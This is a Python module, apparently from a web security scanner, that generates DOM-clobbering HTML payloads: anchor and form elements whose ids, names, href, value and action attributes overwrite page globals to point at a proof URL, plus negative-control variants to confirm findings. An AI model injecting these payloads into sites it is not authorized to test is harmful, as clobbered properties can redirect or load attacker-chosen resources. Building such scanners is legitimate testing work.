"""Dynamic DOM-clobber HTML structure generation from candidate property shapes."""

from __future__ import annotations

import html
import secrets
from dataclasses import dataclass
from typing import List, Optional

from dom_clobber.discovery import ClobberCandidate


@dataclass
class ClobberPayload:
    """One clobber attempt with correlation identifiers."""

    html: str
    property_path: str
    root_name: str
    nested_name: str
    proof_url: str
    nonce: str
    probe_id: str
    candidate_id: str
    variant: str  # anchor_href | form_input | form_action | noncolliding | no_url
    expects_url_field: str  # href|src|action|value|data|""


def _esc(s: str) -> str:
    return html.escape(s or "", quote=True)


def mint_ids() -> tuple[str, str, str]:
    """Fresh nonce, probe_id, candidate_id — never reuse across attempts."""
    nonce = secrets.token_hex(12)
    probe_id = f"dc_{secrets.token_hex(8)}"
    candidate_id = f"cand_{secrets.token_hex(6)}"
    return nonce, probe_id, candidate_id


def build_clobber_payloads(
    candidate: ClobberCandidate,
    *,
    proof_url: str,
    nonce: str = "",
    probe_id: str = "",
    candidate_id: str = "",
    include_nested: bool = True,
) -> List[ClobberPayload]:
    """Generate context-aware clobber structures for a discovered candidate.

    Does not assume a fixed property name — uses whatever discovery found.
    """
    n, pid, cid = nonce, probe_id, candidate_id
    if not n or not pid or not cid:
        n2, pid2, cid2 = mint_ids()
        n = n or n2
        pid = pid or pid2
        cid = cid or cid2

    root = candidate.root_name
    nested = candidate.nested_name
    proof = proof_url or ""
    out: List[ClobberPayload] = []

    # Single global: <a id=root href=PROOF>
    out.append(
        ClobberPayload(
            html=f'<a id="{_esc(root)}" href="{_esc(proof)}">x</a>',
            property_path=root,
            root_name=root,
            nested_name="",
            proof_url=proof,
            nonce=n,
            probe_id=pid,
            candidate_id=cid,
            variant="anchor_href",
            expects_url_field="href",
        )
    )

    # Alternate URL-bearing tag
    out.append(
        ClobberPayload(
            html=f'<a id="{_esc(root)}" name="{_esc(root)}" href="{_esc(proof)}">x</a>',
            property_path=root,
            root_name=root,
            nested_name="",
            proof_url=proof,
            nonce=n,
            probe_id=pid,
            candidate_id=f"{cid}_name",
            variant="anchor_name_href",
            expects_url_field="href",
        )
    )

    if include_nested:
        # Nested form collection: form id=root, input name=url|href|src
        field = nested if nested in ("url", "href", "src", "action", "data", "value") else "url"
        out.append(
            ClobberPayload(
                html=(
                    f'<form id="{_esc(root)}">'
                    f'<input name="{_esc(field)}" value="{_esc(proof)}">'
                    f"</form>"
                ),
                property_path=f"{root}.{field}",
                root_name=root,
                nested_name=field,
                proof_url=proof,
                nonce=n,
                probe_id=pid,
                candidate_id=f"{cid}_form",
                variant="form_input",
                expects_url_field="value",
            )
        )
        out.append(
            ClobberPayload(
                html=f'<form id="{_esc(root)}" action="{_esc(proof)}"></form>',
                property_path=f"{root}.action" if not nested else f"{root}.{nested}",
                root_name=root,
                nested_name="action",
                proof_url=proof,
                nonce=n,
                probe_id=pid,
                candidate_id=f"{cid}_action",
                variant="form_action",
                expects_url_field="action",
            )
        )

    return out


def build_negative_payloads(
    candidate: ClobberCandidate,
    *,
    proof_url: str,
    existing_ids: Optional[set] = None,
) -> List[ClobberPayload]:
    """Negative controls for a positive candidate."""
    existing = set(existing_ids or ())
    existing.add(candidate.root_name)
    from dom_clobber.discovery import random_noncolliding_id

    nonce, probe_id, candidate_id = mint_ids()
    rand_id = random_noncolliding_id(existing)
    rand_prop = random_noncolliding_id(existing, prefix="vcProp")
    proof = proof_url or ""

    return [
        ClobberPayload(
            html="",
            property_path=candidate.root_name,
            root_name=candidate.root_name,
            nested_name="",
            proof_url="",
            nonce=nonce,
            probe_id=f"{probe_id}_baseline",
            candidate_id=f"{candidate_id}_baseline",
            variant="baseline_empty",
            expects_url_field="",
        ),
        ClobberPayload(
            html=f'<a id="{_esc(rand_id)}" href="{_esc(proof)}">x</a>',
            property_path=rand_id,
            root_name=rand_id,
            nested_name="",
            proof_url=proof,
            nonce=nonce,
            probe_id=f"{probe_id}_noncollide",
            candidate_id=f"{candidate_id}_noncollide",
            variant="noncolliding_id",
            expects_url_field="href",
        ),
        ClobberPayload(
            html=f'<a id="{_esc(rand_prop)}" href="{_esc(proof)}">x</a>',
            property_path=rand_prop,
            root_name=rand_prop,
            nested_name="",
            proof_url=proof,
            nonce=nonce,
            probe_id=f"{probe_id}_randprop",
            candidate_id=f"{candidate_id}_randprop",
            variant="random_unused_property",
            expects_url_field="href",
        ),
        ClobberPayload(
            html=f'<a id="{_esc(candidate.root_name)}" href="">x</a>',
            property_path=candidate.root_name,
            root_name=candidate.root_name,
            nested_name="",
            proof_url="",
            nonce=nonce,
            probe_id=f"{probe_id}_nourl",
            candidate_id=f"{candidate_id}_nourl",
            variant="clobber_without_url",
            expects_url_field="href",
        ),
    ]
